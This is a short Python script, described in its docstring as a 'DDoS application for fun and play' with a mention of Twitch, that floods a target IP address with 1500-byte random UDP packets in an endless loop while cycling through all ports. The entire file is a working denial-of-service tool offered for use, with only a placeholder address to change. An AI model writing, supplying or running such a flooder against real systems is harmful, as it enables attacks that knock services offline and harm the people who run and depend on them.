#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""DDoS application for fun and play
   Twitch 
"""
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1500)

ip_address = '0.0.0.0'
port = 8080

sent = 1

while True:
    sock.sendto(bytes, (ip_address, port))
    sent += 1
    port += 1
    print("Sent %s packet to %s through port : %d" % (sent, ip_address, port))
    if port == 65534:
        port = 1
